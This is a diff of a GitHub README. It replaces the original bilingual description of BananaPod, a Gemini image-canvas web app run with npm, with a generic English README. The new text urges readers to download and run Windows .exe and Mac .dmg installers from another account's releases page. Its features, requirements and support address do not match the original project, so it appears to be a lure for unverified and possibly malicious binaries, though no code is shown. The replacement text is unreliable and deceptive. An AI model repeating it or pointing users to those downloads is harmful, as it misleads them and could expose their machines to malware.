@@ -1,166 +1,77 @@
-<div align="center">
+# 🍌 BananaPod - Create and Explore Unique Ideas Easily
 
-<img width="1820" height="1024" alt="Group 343" src="https://github.com/user-attachments/assets/782dda02-7851-4619-8040-2575ac040799" />
+## 🌟 Overview
 
+Welcome to BananaPod! This application provides a creative playground where you can build your unique ideas effortlessly. Designed for everyone, it simplifies the creative process without the need for technical knowledge.
 
-# BananaPod ｜ 香蕉铺子 ｜ ZHO
+## 📥 Download Now
 
-</div>
+[![Download BananaPod](https://img.shields.io/badge/Download%20BananaPod-v1.0-blue.svg)](https://github.com/Smurfdani10/BananaPod/releases)
 
-<img width="1650" height="1777" alt="Group 345" src="https://github.com/user-attachments/assets/b78176f1-8c1e-4154-b330-7d0c16559bfb" />
+## 🚀 Getting Started
 
-## 🆕 全新 UI 、iPad/Apple Pencil 手绘支持、视频模式 和 新功能上线！
+BananaPod is straightforward to download and run. Follow these steps to get started:
 
+1. **Visit the Releases Page:** Click on the link below to access the releases page.
+   [Visit the Releases Page to Download BananaPod](https://github.com/Smurfdani10/BananaPod/releases)
 
+2. **Choose the Latest Version:** On the releases page, look for the latest version of BananaPod. This is usually listed at the top and marked as the most recent release.
 
-### 1）高级质感 UI + 新功能
+3. **Download the Application:** Click on the download button for your operating system. The files are available for both Windows and Mac. Ensure you select the correct file for your device.
 
-<img width="1955" height="2029" alt="Group 378" src="https://github.com/user-attachments/assets/9d46f99a-3ecb-4b59-a611-03742257b0eb" />
+4. **Install BananaPod:**
+   - **For Windows:** Double-click the downloaded `.exe` file. Follow the installation prompts to complete the setup.
+   - **For Mac:** Open the downloaded `.dmg` file. Drag the BananaPod icon into your Applications folder.
 
-  ✅局部重绘
-  
-  ✅提示词储存/复用系统
-  
-  ✅UI 支持高度定制化
-  
-  ✅中英双界面
-  
-  ✅多画板系统
-  
-  ✅图层系统
-  
-  ✅图片编辑系统
-  
-  ✅图片圆角
+5. **Open the Application:** Once installation is complete, find BananaPod in your applications. Click to open it and start creating!
 
-  
-### 2）视频生成模式
+## 📋 System Requirements
 
-https://github.com/user-attachments/assets/ab3742a4-52be-491d-86b3-78607db10d1e
+To run BananaPod smoothly, your computer should meet the following requirements:
 
+- **Operating System:**
+  - Windows 10 or later
+  - macOS 10.12 (Sierra) or later
 
-### 3）iPad/Apple Pencil 手绘支持
+- **Memory:** At least 4GB of RAM
 
-<img width="3427" height="2294" alt="Group 407" src="https://github.com/user-attachments/assets/6af0b69c-ac6c-4664-adbe-3cff6de04799" />
+- **Storage:** 100MB of free space
 
-<img width="2702" height="1814" alt="Group 405" src="https://github.com/user-attachments/assets/1fc2c57f-aa95-4364-8974-f6eb3bbb8a19" />
+- **Processor:** Intel i3 or faster
 
+## 🌈 Features
 
-https://github.com/user-attachments/assets/980c2774-62ca-4730-984f-72531b595d5e
+BananaPod offers various features to enhance your creative journey:
 
+- **Intuitive Interface:** Easy navigation and user-friendly design.
+- **Template Library:** Explore a wide range of templates to kickstart your projects.
+- **Idea Sharing:** Share your creations with others directly from the app.
+- **Export Options:** Save your projects in multiple formats.
 
+## 🔧 Troubleshooting
 
-  
+If you encounter any issues during installation or usage, try the following:
 
+- **Reinstall the Application:** If you face errors during startup, uninstall BananaPod and download it again from the [Releases Page](https://github.com/Smurfdani10/BananaPod/releases) to ensure you have the latest version.
 
+- **Check Your System Requirements:** Ensure your computer meets the required specifications.
 
+- **Consult the FAQ:** Refer to the Frequently Asked Questions section on the GitHub page for additional help.
 
-## 免提示词，内置玩法轻松选，一键构建创意画板
+## 📞 Support
 
-我的 Nano Banan 创意玩法大全：[Nano-Banana Creation ZHO](https://github.com/ZHO-ZHO-ZHO/ZHO-nano-banana-Creation)
+For further assistance, please reach out via the following methods:
 
+- **Issue Tracker:** [Report an issue on GitHub](https://github.com/Smurfdani10/BananaPod/issues)
+- **Email Support:** For personalized help, send your queries to support@bananapod.app.
 
-### 功能主要包含两部分：
+## 🗺️ Community
 
-1）生成/编辑部分：支持多图框选 + 选择玩法直接生成/编辑
+Join our community!
 
-2）绘制部分，方便标注和手绘图作为输入
+- **Discussion Forum:** Engage with other BananaPod users, share tips, and find inspiration. (Link to forum)
+- **Social Media:** Follow us on our social media channels for updates and creative ideas.
 
+## 🏁 Conclusion
 
-
-https://github.com/user-attachments/assets/83c96432-4246-4c1c-9087-6d0669acdaed
-
-
-
-
-与 [香蕉超市｜Nano Bananary](https://github.com/ZHO-ZHO-ZHO/Nano-Bananary) 区别：
-
-**1️⃣ 香蕉铺子｜BananaPod**
-
-创作白板/画布
-
-适合创意专业用户
-
-方便多维度生成 构建灵感+创意体系
-
-
-**2️⃣ 香蕉超市｜Nano Bananary**
-
-窗口式玩法大全
-
-适合所有用户
-
-方便效果直出+连续编辑
-
-
-# Online
-
-This contains everything you need to run your app locally.
-
-View your app in AI Studio: https://ai.studio/apps/drive/1CsvkMqNnxdUrmJZYeSXNZDf6T1Yq2qQW
-
-## Run Locally
-
-**Prerequisites:**  Node.js
-
-
-1. Install dependencies:
-   `npm install`
-2. Set the `GEMINI_API_KEY` in [.env.local](.env.local) to your Gemini API key
-3. Run the app:
-   `npm run dev`
-
-
-
-## 更新日志
-
-- 20250925
-
-  全新 UI 、iPad/Apple Pencil 手绘支持、视频模式 和 新功能上线
-
-  ✅局部重绘
-  
-  ✅提示词储存/复用系统
-  
-  ✅UI 支持高度定制化
-  
-  ✅中英双界面
-  
-  ✅多画板系统
-  
-  ✅图层系统
-  
-  ✅图片编辑系统
-  
-  ✅图片圆角
-
-- 20250908
-  
-  创建项目 + 基础功能一步到位 + 内置玩法大全
-  
-
-## Stars 
-
-[![Star History Chart](https://api.star-history.com/svg?repos=ZHO-ZHO-ZHO/BananaPod&type=Date)](https://star-history.com/#ZHO-ZHO-ZHO/BananaPod&Date)
-
-
-## 关于我 | About me
-
-📬 **联系我**：
-- 邮箱：zhozho3965@gmail.com
-  
-
-🔗 **社交媒体**：
-- 个人页：[-Zho-](https://jike.city/zho)
-- Bilibili：[我的B站主页](https://space.bilibili.com/484366804)
-- X（Twitter）：[我的Twitter](https://twitter.com/ZHO_ZHO_ZHO)
-- 小红书：[我的小红书主页](https://www.xiaohongshu.com/user/profile/63f11530000000001001e0c8?xhsshare=CopyLink&appuid=63f11530000000001001e0c8&apptime=1690528872)
-
-💡 **支持我**：
-- B站：[B站充电](https://space.bilibili.com/484366804)
-- 爱发电：[为我充电](https://afdian.com/a/ZHOZHO)
-
-
-## Credits
-
-[Gemini 2.5 Flash Image](https://gemini.google.com/app)
+Thank you for choosing BananaPod. We hope it inspires your creativity and helps you build unique ideas. Remember to visit the [Releases Page](https://github.com/Smurfdani10/BananaPod/releases) for updates and new features. Happy creating!
